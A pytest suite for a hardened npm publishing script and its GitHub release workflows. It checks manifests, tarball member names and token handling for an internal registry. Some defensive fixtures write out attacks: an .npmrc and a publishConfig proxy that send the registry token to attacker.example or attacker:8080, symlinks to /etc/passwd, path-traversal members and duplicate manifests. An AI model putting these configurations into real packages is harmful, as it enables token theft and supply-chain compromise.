"""Tests for scripts/publish_npm.py and its wiring in both release workflows.

`prepare` runs the real `npm pack` (no network); `publish` runs against a stub `npm` on PATH that
hands `pack` to the real one and answers `view` and `publish` itself, recording the argument
list, the `.npmrc` it was given and the token it saw.
"""

from __future__ import annotations

import importlib.util
import json
import os
import shutil
import stat
import subprocess
import sys
import zipfile
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
SCRIPT = ROOT / "scripts" / "publish_npm.py"
spec = importlib.util.spec_from_file_location("publish_npm", SCRIPT)
pn = importlib.util.module_from_spec(spec)
sys.modules["publish_npm"] = pn
spec.loader.exec_module(pn)

ENDPOINT = "https://em-111.d.codeartifact.us-east-2.amazonaws.com/npm/em-platform/"
TOKEN = "tok-secret-value"
REAL_NPM = shutil.which("npm")

STUB = """#!/bin/sh
# npm gets a minimal environment, so the stub's settings live in a file beside it.
. "$(dirname "$0")/stub.conf"
cmd="$1"
if [ "$cmd" = pack ]; then exec "$REAL_NPM" "$@"; fi
{
  echo "cmd: $*"
  echo "cwd: $(pwd)"
  echo "home: $HOME"
  echo "env-names: $(env | cut -d= -f1 | sort | tr '\\n' ' ')"
  echo "token: $CODEARTIFACT_AUTH_TOKEN"
  rc=""
  for a in "$@"; do [ "$prev" = "--userconfig" ] && rc="$a"; prev="$a"; done
  echo "npmrc-mode: $(stat -c %a "$rc" 2>/dev/null || stat -f %Lp "$rc")"
  echo "---npmrc"; cat "$rc"
} >> "$STUB_LOG"
if [ "$cmd" = view ]; then
  case "$STUB_VIEW" in
    404) echo "npm error code E404" >&2; exit 1 ;;
    net) echo "npm error code ETIMEDOUT" >&2; exit 1 ;;
    *) echo "\\"$STUB_VIEW\\""; exit 0 ;;
  esac
fi
exit "${STUB_EXIT:-0}"
"""


@pytest.fixture(autouse=True)
def needs_npm() -> None:
    if REAL_NPM is None:
        if os.environ.get("CI"):
            pytest.fail("npm is required in CI for these tests")
        pytest.skip("npm is not installed")


STUB_KEYS = {"log": "STUB_LOG", "view": "STUB_VIEW", "exit": "STUB_EXIT"}


def stub_conf(bindir: Path, **values: object) -> None:
    """(Re)write the stub's settings; a key not passed keeps its earlier value."""
    path = bindir / "stub.conf"
    current: dict[str, str] = {"STUB_EXIT": "0", "REAL_NPM": str(REAL_NPM)}
    if path.exists():
        for line in path.read_text().splitlines():
            key, _, value = line.partition("=")
            current[key] = value.strip("'")
    for key, value in values.items():
        current[STUB_KEYS[key]] = str(value)
    path.write_text("".join(f"{k}='{v}'\n" for k, v in current.items()))


@pytest.fixture
def env(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> dict[str, Path]:
    bindir = tmp_path / "bin"
    bindir.mkdir()
    npm = bindir / "npm"
    npm.write_text(STUB)
    npm.chmod(npm.stat().st_mode | stat.S_IXUSR)
    work = tmp_path / "work"
    work.mkdir()
    temp = tmp_path / "temp"
    temp.mkdir()
    monkeypatch.setenv("PATH", f"{bindir}{os.pathsep}{os.environ['PATH']}")
    stub_conf(bindir, log=tmp_path / "log.txt", view="404")
    monkeypatch.setenv(pn.TOKEN_VAR, TOKEN)
    monkeypatch.chdir(work)
    return {
        "work": work,
        "temp": temp,
        "log": tmp_path / "log.txt",
        "out": work / "packed",
        "bin": bindir,
    }


def package(work: Path, content: str = "one", **over: object) -> Path:
    manifest: dict[str, object] = {
        "name": "@emergentmatter/contract",
        "version": "0.0.0",
        "files": ["data.json"],
        **over,
    }
    pkg = work / "pkg"
    pkg.mkdir(exist_ok=True)
    (pkg / "package.json").write_text(json.dumps(manifest), encoding="utf-8")
    (pkg / "data.json").write_text(json.dumps({"v": content}), encoding="utf-8")
    return pkg


def prepare(
    env: dict[str, Path], pkg: Path, version: str = "1.4.0", wheels: Path | None = None
) -> int:
    argv = [
        "prepare",
        "--package-dir",
        str(pkg),
        "--version",
        version,
        "--out-dir",
        str(env["out"]),
    ]
    return pn.main(argv + ["--wheel-dir", str(wheels or env["work"] / "dist")])


def tarball(env: dict[str, Path]) -> Path:
    (found,) = env["out"].glob("*.tgz")
    return found


def canonical_integrity(env: dict[str, Path], tgz: Path) -> str:
    """The integrity `publish` computes: of the tarball rebuilt from the members it checked."""
    rebuilt = env["temp"].parent / "rebuilt.tgz"
    pn.write_canonical(pn.read_members(tgz), rebuilt)
    return pn.integrity_of(rebuilt)


def publish(env: dict[str, Path], tgz: Path, endpoint: str = ENDPOINT) -> int:
    return pn.main(
        ["publish", "--tarball", str(tgz), "--endpoint", endpoint, "--temp-dir", str(env["temp"])]
    )


def wheel(dest: Path, files: dict[str, str]) -> Path:
    dest.mkdir(exist_ok=True)
    path = dest / "x-1.4.0-py3-none-any.whl"
    with zipfile.ZipFile(path, "w") as archive:
        for name, text in files.items():
            archive.writestr(name, text)
    return path


# -------------------------------------------------------------------- prepare


def test_prepare_stamps_the_version_and_packs_the_tarball(env):
    pkg = package(env["work"])
    assert prepare(env, pkg) == 0
    assert json.loads((pkg / "package.json").read_text())["version"] == "1.4.0"
    files = pn.tarball_files(tarball(env))
    assert json.loads(files["package.json"])["version"] == "1.4.0"
    assert set(files) == {"package.json", "data.json"}


def test_prepare_runs_the_packages_prepack(env):
    rewrite = "require('fs').writeFileSync('data.json', JSON.stringify({v: 'packed'}))"
    pkg = package(env["work"], scripts={"prepack": f'node -e "{rewrite}"'})
    assert prepare(env, pkg) == 0
    assert json.loads(pn.tarball_files(tarball(env))["data.json"]) == {"v": "packed"}


@pytest.mark.parametrize(
    ("over", "version", "why"),
    [
        ({"name": "contract"}, "1.0.0", "not scoped"),
        ({"private": True}, "1.0.0", "private"),
        ({"publishConfig": {"registry": "https://registry.npmjs.org/"}}, "1.0.0", "publishConfig"),
        (
            {"publishConfig": {"@emergentmatter:registry": "https://x.example/"}},
            "1.0.0",
            "registry",
        ),
        ({"scripts": {"postinstall": "node x.js"}}, "1.0.0", "install-time"),
        ({"scripts": {"prepare": "x"}}, "1.0.0", "install-time"),
        ({}, "1.0.0-rc.1", "MAJOR.MINOR.PATCH"),
        ({}, "v1.0.0", "MAJOR.MINOR.PATCH"),
        ({}, "01.0.0", "MAJOR.MINOR.PATCH"),
    ],
)
def test_prepare_refuses_a_package_that_must_not_be_published(env, capsys, over, version, why):
    assert prepare(env, package(env["work"], **over), version) == 1
    assert why in capsys.readouterr().err
    assert not env["out"].exists() or not list(env["out"].glob("*.tgz"))


def test_prepare_refuses_a_package_directory_outside_the_workspace(env, tmp_path):
    outside = tmp_path / "elsewhere"
    outside.mkdir()
    pkg = package(outside)
    assert prepare(env, pkg) == 1


def test_prepare_refuses_a_missing_package_json(env):
    (env["work"] / "empty").mkdir()
    assert prepare(env, env["work"] / "empty") == 1


def test_prepare_refuses_a_files_entry_that_is_not_in_the_tarball(env, capsys):
    pkg = package(env["work"], files=["data.json", "dist"])
    assert prepare(env, pkg) == 1
    err = capsys.readouterr().err
    assert "dist" in err
    assert "data.json" not in err.split("lists", 1)[1].split("in files")[0]


def test_prepare_accepts_a_files_directory_and_ignores_globs_and_negations(env):
    pkg = package(env["work"], files=["data.json", "dist", "!dist/skip.txt", "docs/*.md"])
    (pkg / "dist").mkdir()
    (pkg / "dist" / "index.js").write_text("export {}\n")
    assert prepare(env, pkg) == 0


MIRROR = {"em-release": {"mirrors-wheel-dir": "pkg_chat"}}


def test_a_mirrored_package_must_match_the_wheel_byte_for_byte(env):
    pkg = package(env["work"], **MIRROR)
    good = wheel(
        env["work"] / "dist", {"pkg_chat/data.json": '{"v": "one"}', "pkg_chat/extra.json": "x"}
    )
    assert prepare(env, pkg, wheels=good.parent) == 0


def test_a_mirrored_package_whose_file_differs_from_the_wheel_is_refused(env, capsys):
    pkg = package(env["work"], **MIRROR)
    wheel(env["work"] / "dist", {"pkg_chat/data.json": '{"v": "other"}'})
    assert prepare(env, pkg) == 1
    assert "differs: data.json" in capsys.readouterr().err


def test_a_mirrored_package_with_a_file_the_wheel_lacks_is_refused(env, capsys):
    pkg = package(env["work"], **MIRROR)
    wheel(env["work"] / "dist", {"pkg_chat/other.json": "{}"})
    assert prepare(env, pkg) == 1
    assert "not in the wheel: data.json" in capsys.readouterr().err


def test_a_mirrored_package_with_no_wheel_or_no_such_directory_is_refused(env, capsys):
    pkg = package(env["work"], **MIRROR)
    assert prepare(env, pkg) == 1  # no dist/ at all
    wheel(env["work"] / "dist", {"elsewhere/data.json": "{}"})
    assert prepare(env, pkg) == 1
    assert "no built wheel holds pkg_chat/" in capsys.readouterr().err


# -------------------------------------------------------------------- publish


def packed(env, **kw):
    assert prepare(env, package(env["work"], **kw)) == 0
    return tarball(env)


def test_publish_uses_a_scope_only_npmrc_and_the_token_only_through_the_environment(env, capsys):
    tgz = packed(env)
    assert publish(env, tgz) == 0
    log = env["log"].read_text()
    assert (
        "cmd: publish " in log
        and f"--registry {ENDPOINT}" in log
        and "publish ./publish.tgz" in log
    )
    assert "npmrc-mode: 600" in log
    npmrc = log.split("---npmrc\n")[1].split("cmd:")[0]
    assert npmrc == (
        f"@emergentmatter:registry={ENDPOINT}\n"
        "//em-111.d.codeartifact.us-east-2.amazonaws.com/npm/em-platform/"
        ":_authToken=${CODEARTIFACT_AUTH_TOKEN}\n"
    )
    assert TOKEN not in npmrc and "token: " + TOKEN in log
    out = capsys.readouterr()
    assert TOKEN not in out.out + out.err
    assert list(env["temp"].iterdir()) == []
    assert not (env["work"] / ".npmrc").exists()


def test_publish_skips_a_version_already_there_with_the_same_content(env, monkeypatch):
    tgz = packed(env)
    stub_conf(env["bin"], view=canonical_integrity(env, tgz))
    assert publish(env, tgz) == 0
    assert "cmd: publish" not in env["log"].read_text()


def test_publish_fails_for_the_same_version_with_different_content(env, monkeypatch, capsys):
    tgz = packed(env)
    stub_conf(env["bin"], view="sha512-AAAA")
    assert publish(env, tgz) == 1
    assert "already exists with different content" in capsys.readouterr().err
    assert "cmd: publish" not in env["log"].read_text()


def test_publish_fails_when_it_cannot_ask_the_registry(env, monkeypatch, capsys):
    tgz = packed(env)
    stub_conf(env["bin"], view="net")
    assert publish(env, tgz) == 1
    assert "could not ask the registry" in capsys.readouterr().err
    assert "cmd: publish" not in env["log"].read_text()


def test_a_failed_npm_publish_fails_the_run_and_still_cleans_up(env, monkeypatch, capsys):
    tgz = packed(env)
    stub_conf(env["bin"], exit="1")
    assert publish(env, tgz) == 1
    assert "npm publish failed" in capsys.readouterr().err
    assert list(env["temp"].iterdir()) == []


@pytest.mark.parametrize("endpoint", ["http://x.example/npm/r/", "ftp://x/", "https://x/?a=1", "x"])
def test_publish_refuses_an_endpoint_that_is_not_plain_https(env, endpoint):
    assert publish(env, packed(env), endpoint) == 1
    assert not env["log"].exists()


def test_publish_refuses_without_the_token(env, monkeypatch):
    tgz = packed(env)
    monkeypatch.delenv(pn.TOKEN_VAR)
    assert publish(env, tgz) == 1
    assert not env["log"].exists()


def test_publish_rechecks_the_packed_manifest(env, tmp_path, capsys):
    # A tarball someone packed by hand with an install script is refused at publish too.
    pkg = package(env["work"], scripts={"postinstall": "x"})
    env["out"].mkdir()
    subprocess.run(
        [
            REAL_NPM,
            "pack",
            "--pack-destination",
            str(env["out"]),
            "--ignore-scripts",
            "--loglevel",
            "error",
        ],
        cwd=pkg,
        check=True,
        capture_output=True,
    )
    assert publish(env, tarball(env)) == 1
    assert "install-time" in capsys.readouterr().err
    assert not env["log"].exists()


# ---------------------------------------------------------------- the workflows

WORKFLOWS = [ROOT / ".github/workflows/version.yml", ROOT / ".github/workflows/build-release.yml"]


def step(text: str, name: str) -> str:
    return text.split(f"- name: {name}")[1].split("\n      - name:")[0]


def test_both_workflows_take_npm_packages_and_a_pinned_node_version():
    for path in WORKFLOWS:
        text = path.read_text(encoding="utf-8")
        for name, default in (("npm-packages", '""'), ("node-version", '"24.18.0"')):
            block = text.split(f"      {name}:\n")[1].split("\n\n")[0]
            assert "type: string" in block and f"default: {default}" in block, (path.name, name)


def test_both_workflows_refuse_npm_packages_for_any_other_target():
    for path in WORKFLOWS:
        text = path.read_text(encoding="utf-8")
        validate = step(text, "Validate inputs for this publish target")
        assert "npm-packages needs publish-target 'codeartifact'" in validate


def test_every_npm_package_is_checked_before_anything_is_uploaded():
    for path in WORKFLOWS:
        text = path.read_text(encoding="utf-8")
        prepare = text.index("- name: Pack and check npm packages")
        assert text.index("- name: Download build artifact") < prepare
        for later in ("- name: Publish to PyPI", "- name: Configure AWS credentials"):
            assert prepare < text.index(later), (path.name, later)
        body = step(text, "Pack and check npm packages")
        assert " prepare " in body and "--wheel-dir dist" in body
        assert "aws " not in body and "CODEARTIFACT_AUTH_TOKEN" not in body


def test_the_networked_npm_step_is_codeartifact_only_and_before_the_wheel_upload():
    for path in WORKFLOWS:
        text = path.read_text(encoding="utf-8")
        body = step(text, "Publish npm packages to CodeArtifact")
        assert "if: inputs.publish-target == 'codeartifact' && inputs.npm-packages != ''" in body
        assert "--format npm" in body and " publish " in body
        assert "${{ inputs.npm-packages }}" not in body.split("run: |")[1], "input in shell"
        assert text.index("- name: Publish npm packages to CodeArtifact") < text.index(
            "- name: Publish to CodeArtifact"
        )


def test_node_is_pinned_by_commit_and_version_in_both_workflows():
    for path in WORKFLOWS:
        body = step(path.read_text(encoding="utf-8"), "Set up Node")
        assert "actions/setup-node@" in body and "# v" in body
        assert "node-version: ${{ inputs.node-version }}" in body


# --------------------------------------------------------------------- verify


def built(env: dict[str, Path], **over: object) -> Path:
    """A tarball made the way a caller's own job would: packed from a built directory."""
    pkg = package(env["work"], **over)
    out = env["work"] / "built"
    assert (
        pn.main(["prepare", "--package-dir", str(pkg), "--version", "1.4.0", "--out-dir", str(out)])
        == 0
    )
    return out


def run_verify(env: dict[str, Path], artifacts: Path, version: str = "1.4.0") -> int:
    return pn.main(
        [
            "verify",
            "--package-dir",
            str(env["work"] / "pkg"),
            "--artifact-dir",
            str(artifacts),
            "--version",
            version,
            "--out-dir",
            str(env["out"]),
        ]
    )


def raw_tarball(dest: Path, members: dict[str, str | None], name: str = "x.tgz") -> Path:
    """A tarball written by hand: a value of None is a symlink member."""
    import io
    import tarfile

    dest.mkdir(parents=True, exist_ok=True)
    path = dest / name
    with tarfile.open(path, "w:gz") as archive:
        for member, content in members.items():
            info = tarfile.TarInfo(member)
            if content is None:
                info.type = tarfile.SYMTYPE
                info.linkname = "/etc/passwd"
                archive.addfile(info)
            else:
                data = content.encode()
                info.size = len(data)
                archive.addfile(info, io.BytesIO(data))
    return path


def manifest_text(**over: object) -> str:
    return json.dumps(
        {"name": "@emergentmatter/contract", "version": "1.4.0", "files": ["data.json"], **over}
    )


def test_verify_accepts_what_the_caller_built_and_never_runs_npm(env):
    artifacts = built(env)
    shutil.rmtree(env["out"], ignore_errors=True)
    env["log"].unlink(missing_ok=True)
    assert run_verify(env, artifacts) == 0
    assert set(pn.tarball_files(tarball(env))) == {"package.json", "data.json"}
    assert not env["log"].exists(), "verify must not run npm"


def test_verify_refuses_a_version_that_is_not_the_release(env, capsys):
    assert run_verify(env, built(env), "1.5.0") == 1
    assert "not the release 1.5.0" in capsys.readouterr().err
    assert not list(env["out"].glob("*.tgz"))


@pytest.mark.parametrize(
    ("over", "why"),
    [
        ({"private": True}, "private"),
        ({"publishConfig": {"registry": "https://registry.npmjs.org/"}}, "publishConfig"),
        ({"scripts": {"postinstall": "node x.js"}}, "install-time"),
        ({"files": ["data.json", "dist"]}, "nothing there"),
    ],
)
def test_verify_refuses_a_tarball_that_fails_the_manifest_checks(env, capsys, over, why):
    package(env["work"])
    artifacts = env["work"] / "built"
    raw_tarball(
        artifacts,
        {"package/package.json": manifest_text(**over), "package/data.json": "{}"},
    )
    assert run_verify(env, artifacts) == 1
    assert why in capsys.readouterr().err


def test_verify_refuses_a_tarball_for_another_package_or_two_for_this_one(env, capsys):
    package(env["work"])
    artifacts = env["work"] / "built"
    raw_tarball(artifacts, {"package/package.json": manifest_text(name="@emergentmatter/other")})
    assert run_verify(env, artifacts) == 1
    assert "found 0" in capsys.readouterr().err
    for name in ("a.tgz", "b.tgz"):
        raw_tarball(
            artifacts, {"package/package.json": manifest_text(), "package/data.json": "{}"}, name
        )
    assert run_verify(env, artifacts) == 1
    assert "found 2" in capsys.readouterr().err


@pytest.mark.parametrize(
    "members",
    [
        {"package/package.json": manifest_text(), "package/data.json": "{}", "evil": "x"},
        {"package/package.json": manifest_text(), "package/../up.json": "x"},
        {"package/package.json": manifest_text(), "package/data.json": None},
        {"package/package.json": manifest_text(), "package/.npmrc": "x"},
    ],
    ids=["outside-package", "dotdot", "symlink", "npmrc"],
)
def test_verify_refuses_unsafe_members(env, members):
    package(env["work"])
    artifacts = env["work"] / "built"
    raw_tarball(artifacts, members)
    assert run_verify(env, artifacts) == 1


def test_verify_refuses_an_empty_artifact_directory(env):
    package(env["work"])
    (env["work"] / "built").mkdir()
    assert run_verify(env, env["work"] / "built") == 1


@pytest.mark.parametrize("path", ["version.yml", "build-release.yml"])
def test_a_caller_built_tarball_is_verified_never_built_by_the_publish_job(path):
    text = (ROOT / ".github" / "workflows" / path).read_text(encoding="utf-8")
    assert "npm-tarballs-artifact:" in text
    publish = text[text.index("\n  publish:") :]
    assert "name: ${{ inputs.npm-tarballs-artifact }}" in publish
    pack = publish[publish.index("- name: Pack and check npm packages") :][:900]
    assert "inputs.npm-tarballs-artifact == ''" in pack
    verify_step = publish[publish.index("- name: Verify the npm tarballs the caller built") :][:900]
    assert "inputs.npm-tarballs-artifact != ''" in verify_step
    assert 'publish_npm.py" verify' in verify_step
    for forbidden in ("npm ci", "npm install", "bun install", "bun run", "npm run"):
        assert forbidden not in publish, forbidden
    assert "npm-tarballs-artifact needs npm-packages" in publish


# --------------------------------------------------- one manifest: normalised names


def hand_made(dest: Path, names: list[str], manifests: list[str], name: str = "x.tgz") -> Path:
    """A tarball whose members are exactly `names`, each holding the matching manifest text."""
    return raw_tarball(dest, dict(zip(names, manifests, strict=True)), name)


BENIGN = manifest_text()
REAL = manifest_text(version="99.0.0", scripts={"postinstall": "node dist/index.js"})
DATA = "{}"

# Each is a tarball in which npm and a reader that keys on the written name disagree about
# which package.json is the manifest. The first manifest is benign, the last is the one npm uses.
TWO_MANIFESTS = {
    "dotslash": ["package/package.json", "package/data.json", "package/./package.json"],
    "doubleslash": ["package/package.json", "package/data.json", "package//package.json"],
    "backslash": ["package/package.json", "package/data.json", "package\\package.json"],
    "trailing-slash": ["package/package.json", "package/data.json", "package/package.json/"],
    "duplicate": ["package/package.json", "package/data.json", "package/package.json"],
    "dotdot-roundtrip": ["package/package.json", "package/data.json", "package/x/../package.json"],
}


def duplicate_safe(names: list[str]) -> dict[str, str]:
    """`raw_tarball` takes a dict, so repeated names need distinct keys that tar writes alike."""
    return {
        name: BENIGN if i == 0 else (REAL if i == len(names) - 1 else DATA)
        for i, name in enumerate(names)
    }


def write_attack(dest: Path, names: list[str]) -> Path:
    import io
    import tarfile

    dest.mkdir(parents=True, exist_ok=True)
    path = dest / "x.tgz"
    texts = duplicate_safe(names)
    with tarfile.open(path, "w:gz") as archive:
        for i, name in enumerate(names):
            text = BENIGN if i == 0 else (REAL if i == len(names) - 1 else DATA)
            data = text.encode()
            info = tarfile.TarInfo(name)
            info.size = len(data)
            archive.addfile(info, io.BytesIO(data))
    assert texts  # keep the helper's contract visible
    return path


@pytest.mark.parametrize("shape", sorted(TWO_MANIFESTS))
def test_verify_refuses_a_tarball_with_two_ways_to_name_the_manifest(env, capsys, shape):
    package(env["work"])
    artifacts = env["work"] / "built"
    write_attack(artifacts, TWO_MANIFESTS[shape])
    assert run_verify(env, artifacts) == 1
    err = capsys.readouterr().err
    assert "not a normal path" in err or "more than once" in err
    assert not list(env["out"].glob("*.tgz")) if env["out"].exists() else True


@pytest.mark.parametrize("shape", sorted(TWO_MANIFESTS))
def test_publish_refuses_the_same_tarballs_without_verify(env, shape):
    package(env["work"])
    tgz = write_attack(env["work"] / "built", TWO_MANIFESTS[shape])
    assert publish(env, tgz) == 1
    assert not env["log"].exists()


def test_verify_publishes_a_canonical_tarball_rebuilt_from_what_it_checked(env):
    artifacts = built(env)
    assert run_verify(env, artifacts) == 0
    (first,) = env["out"].glob("*.tgz")
    assert first.name == "emergentmatter-contract-1.4.0.tgz"
    import tarfile

    with tarfile.open(first) as archive:
        members = archive.getmembers()
    assert [m.name for m in members] == ["package/data.json", "package/package.json"]
    assert {(m.uid, m.gid, m.mtime) for m in members} == {(0, 0, 0)}
    assert all(m.isfile() for m in members)
    # The same members give the same bytes, so a re-run's integrity matches the first run's.
    again = env["work"] / "again"
    pn.write_canonical(
        pn.read_members(artifacts / next(artifacts.glob("*.tgz")).name), again.with_suffix(".tgz")
    )
    assert again.with_suffix(".tgz").read_bytes() == first.read_bytes()


def test_the_published_tarball_is_the_one_that_was_checked(env):
    """npm and the checker see one manifest: the verified version, not another."""
    artifacts = built(env)
    assert run_verify(env, artifacts) == 0
    (out,) = env["out"].glob("*.tgz")
    extracted = env["work"] / "extracted"
    extracted.mkdir()
    subprocess.run(["tar", "xzf", str(out), "-C", str(extracted)], check=True)
    assert json.loads((extracted / "package" / "package.json").read_text())["version"] == "1.4.0"


# ------------------------------------------- npm runs where no checkout config can reach it


HOSTILE = (
    "@emergentmatter:registry=https://attacker.example/x/\n"
    "//attacker.example/x/:_authToken=${CODEARTIFACT_AUTH_TOKEN}\n"
)


def npm_config_get(key: str, cwd: Path, args: list[str], environment: dict[str, str]) -> str:
    result = subprocess.run(
        [REAL_NPM, "config", "get", key, *args],
        cwd=cwd,
        env=environment,
        capture_output=True,
        text=True,
        check=True,
    )
    return result.stdout.strip()


def test_a_hostile_npmrc_in_the_checkout_is_never_read(env, tmp_path, monkeypatch):
    checkout = env["work"]
    (checkout / ".npmrc").write_text(HOSTILE)
    (checkout / "package.json").write_text("{}")
    inside = checkout / "tmp"  # a temp dir under the checkout would walk up into the hostile file
    inside.mkdir()
    workdir = Path(__import__("tempfile").mkdtemp(prefix="em-npm-", dir=inside))
    (workdir / "npmrc").write_text(pn.npmrc_text("@emergentmatter", ENDPOINT))
    config = pn.npm_config(workdir, ENDPOINT)
    environment = pn.npm_environment(workdir)

    # The control: npm as the old code ran it, in the checkout, does read the hostile file.
    old_args = ["--userconfig", str(workdir / "npmrc"), "--registry", ENDPOINT]
    old_env = {**os.environ, "HOME": str(tmp_path)}
    assert "attacker.example" in npm_config_get(
        "@emergentmatter:registry", checkout, old_args, old_env
    )

    # As publish runs it, the registry is ours and the attacker's host has no credential.
    registry = npm_config_get("@emergentmatter:registry", workdir, config, environment)
    assert registry == ENDPOINT
    listing = subprocess.run(
        [REAL_NPM, "config", "list", *config],
        cwd=workdir,
        env=environment,
        capture_output=True,
        text=True,
        check=False,
    )
    assert "attacker.example" not in listing.stdout + listing.stderr


def test_npm_sees_a_minimal_environment_in_a_directory_that_is_not_the_checkout(env, monkeypatch):
    for name in ("AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN", "GITHUB_TOKEN"):
        monkeypatch.setenv(name, "must-not-reach-npm")
    (env["work"] / ".npmrc").write_text(HOSTILE)
    tgz = packed(env)
    assert publish(env, tgz) == 0
    log = env["log"].read_text()
    cwds = {line.split(": ", 1)[1] for line in log.splitlines() if line.startswith("cwd: ")}
    homes = {line.split(": ", 1)[1] for line in log.splitlines() if line.startswith("home: ")}
    assert len(cwds) == 1 and cwds == homes
    (cwd,) = cwds
    assert Path(cwd).parent.resolve() == env["temp"].resolve()
    assert env["work"].resolve() not in [Path(cwd).resolve(), *Path(cwd).resolve().parents]
    names = {
        n for line in log.splitlines() if line.startswith("env-names: ") for n in line.split()[1:]
    }
    assert {"PATH", "HOME", pn.TOKEN_VAR} <= names
    assert names <= {"PATH", "HOME", pn.TOKEN_VAR, "PWD", "SHLVL", "_", "OLDPWD"}, names
    assert "must-not-reach-npm" not in log
    assert "--globalconfig" in log and "--prefix" in log


# ------------------------------------------------ publishConfig: only access and tag


def refused(manifest: dict[str, object]) -> str:
    with pytest.raises(pn.PublishError) as caught:
        pn.check_manifest(manifest, "1.4.0")
    return str(caught.value)


def with_config(config: object) -> dict[str, object]:
    return {"name": "@emergentmatter/contract", "version": "1.4.0", "publishConfig": config}


@pytest.mark.parametrize(
    "key",
    [
        "https-proxy",
        "proxy",
        "strict-ssl",
        "ca",
        "cafile",
        "cert",
        "key",
        "registry",
        "@emergentmatter:registry",
        "//attacker.example/x/:_authToken",
        "some-unknown-key",
    ],
)
def test_a_publish_config_key_other_than_access_and_tag_is_refused(key):
    assert key in refused(with_config({key: "x"}))


@pytest.mark.parametrize("config", ["https-proxy=x", ["access"], 1, True])
def test_a_publish_config_that_is_not_an_object_is_refused(config):
    assert "not an object" in refused(with_config(config))


def test_access_must_be_restricted_and_tag_a_plain_dist_tag():
    assert "access" in refused(with_config({"access": "public"}))
    for tag in ("^1.0.0", "1.2.3", "Latest", "", "-x", 5):
        assert "tag" in refused(with_config({"tag": tag}))
    for good in (
        {},
        {"access": "restricted"},
        {"tag": "next"},
        {"access": "restricted", "tag": "rc-1.x"},
    ):
        assert pn.check_manifest(with_config(good), "1.4.0") == "@emergentmatter"


def test_the_proxy_config_that_sent_the_token_to_another_host_is_refused(env, capsys):
    """A built manifest naming an attacker's proxy and turning off certificate checks.

    npm applies publishConfig keys the command line did not set, so this tunnelled the publish,
    token included, through the proxy.
    """
    package(env["work"])
    artifacts = env["work"] / "built"
    hostile = manifest_text(
        publishConfig={"https-proxy": "http://attacker:8080", "strict-ssl": False}
    )
    raw_tarball(artifacts, {"package/package.json": hostile, "package/data.json": "{}"})
    assert run_verify(env, artifacts) == 1
    assert "https-proxy" in capsys.readouterr().err
    assert publish(env, artifacts / "x.tgz") == 1
    assert not env["log"].exists()


# ------------------------------------- member names: ASCII, and one name per case-folded name


def verify_members(env: dict[str, Path], members: dict[str, str | None]) -> int:
    package(env["work"])
    artifacts = env["work"] / "built"
    raw_tarball(artifacts, members)
    return run_verify(env, artifacts)


KELVIN = "package/pac\N{KELVIN SIGN}age.json"


@pytest.mark.parametrize(
    "extra",
    [KELVIN, "package/dist/caf\N{LATIN SMALL LETTER E WITH ACUTE}.js", "package/a b.js"],
    ids=["kelvin-sign", "non-ascii", "space"],
)
def test_verify_refuses_member_names_outside_ascii(env, capsys, extra):
    members = {"package/package.json": manifest_text(), "package/data.json": "{}", extra: "x"}
    assert verify_members(env, members) == 1
    assert "limited to ASCII" in capsys.readouterr().err


@pytest.mark.parametrize(
    ("first", "second"),
    [
        ("package/README.md", "package/readme.md"),
        ("package/package.json", "package/Package.json"),
        ("package/dist/A.js", "package/dist/a.js"),
    ],
    ids=["readme", "package-json", "directory-file"],
)
def test_verify_refuses_two_names_that_differ_only_in_case(env, capsys, first, second):
    members = {"package/data.json": "{}", first: manifest_text(), second: "x"}
    if "package/package.json" not in members:
        members["package/package.json"] = manifest_text()
    assert verify_members(env, members) == 1
    assert "differs only in case" in capsys.readouterr().err


def test_a_name_with_letters_digits_and_the_allowed_punctuation_still_passes(env):
    members = {
        "package/package.json": manifest_text(name="@emergentmatter/ui-kit", files=["dist"]),
        "package/dist/index.js": "export {}",
        "package/dist/@scope+x/a_b-1.0.min.js": "export {}",
        "package/dist/Button/Button.d.ts": "export {}",
    }
    package(env["work"], name="@emergentmatter/ui-kit", files=["dist"])
    artifacts = env["work"] / "built"
    raw_tarball(artifacts, members)
    assert run_verify(env, artifacts) == 0


# ----------------------------------- names that do not extract the same on every platform


@pytest.mark.parametrize(
    "extra",
    [
        "package/package.json.",
        "package/package.json..",
        "package/con.js",
        "package/dist/aux",
        "package/LPT1.txt",
        "package/dist/Nul.d.ts",
    ],
    ids=["trailing-dot", "two-trailing-dots", "con.js", "dist-aux", "LPT1.txt", "Nul.d.ts"],
)
def test_verify_refuses_trailing_dots_and_windows_device_names(env, capsys, extra):
    members = {"package/package.json": manifest_text(), "package/data.json": "{}", extra: "x"}
    assert verify_members(env, members) == 1
    assert "Windows device name" in capsys.readouterr().err


def test_a_name_that_only_starts_like_a_device_name_still_passes(env):
    members = {
        "package/package.json": manifest_text(name="@emergentmatter/ui-kit", files=["dist"]),
        "package/dist/console.js": "export {}",
        "package/dist/auxiliary.js": "export {}",
        "package/dist/com10.js": "export {}",
    }
    package(env["work"], name="@emergentmatter/ui-kit", files=["dist"])
    artifacts = env["work"] / "built"
    raw_tarball(artifacts, members)
    assert run_verify(env, artifacts) == 0
